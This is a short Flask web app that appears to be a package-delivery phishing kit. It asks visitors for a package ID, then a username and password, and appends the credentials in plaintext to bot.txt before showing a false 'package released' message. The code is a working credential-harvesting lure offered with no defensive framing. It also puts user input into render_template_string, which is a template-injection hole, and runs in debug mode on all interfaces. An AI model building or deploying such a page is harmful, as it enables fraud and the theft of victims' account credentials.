#!/usr/bin/env python3

from flask import Flask, request, session, redirect, url_for, render_template_string
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)  # key for session management

@app.route("/", methods=["GET", "POST"])
def get_package_id():
    if request.method == "POST":
        package_id = request.form.get("package_id")
        session["package_id"] = package_id
        return redirect(url_for("get_user_credentials"))
    
    html_form = """
    <!DOCTYPE html>
    <html>
      <head>
        <title>Enter Package ID</title>
      </head>
      <body>
        <h1>Please Enter Your Package ID</h1>
        <form method="POST" action="/">
          <input type="text" name="package_id" placeholder="Package ID" required>
          <button type="submit">Submit</button>
        </form>
      </body>
    </html>
    """
    return render_template_string(html_form)

@app.route("/login", methods=["GET", "POST"])
def get_user_credentials():
    package_id = session.get("package_id", None)
    
    # If the user directly visits /login without a package_id in session, redirect home
    if package_id is None:
        return redirect(url_for("get_package_id"))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Append the data to bot.txt in CSV format: packageID,username,password
        with open("bot.txt", "a") as f:
            f.write(f"{package_id},{username},{password}\n")
        
        return redirect(url_for("package_released"))
    
    # Display the package ID and ask for username & password
    html_form = f"""
    <!DOCTYPE html>
    <html>
      <head>
        <title>User Credentials</title>
      </head>
      <body>
        <h1>Package ID: {package_id}</h1>
        <form method="POST" action="/login">
          <label for="username">Username:</label>
          <input type="text" name="username" placeholder="Username" required><br><br>
          
          <label for="password">Password:</label>
          <input type="password" name="password" placeholder="Password" required><br><br>
          
          <button type="submit">Submit</button>
        </form>
      </body>
    </html>
    """
    return render_template_string(html_form)

@app.route("/released", methods=["GET"])
def package_released():
    # Clear the session to reset for the next entry
    session.clear()
    
    html_msg = """
    <!DOCTYPE html>
    <html>
      <head>
        <title>Package Released</title>
      </head>
      <body>
        <h1>Your package has been released and will be delivered soon!</h1>
        <p><a href="/">Click here</a> to submit another package.</p>
      </body>
    </html>
    """
    return render_template_string(html_msg)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)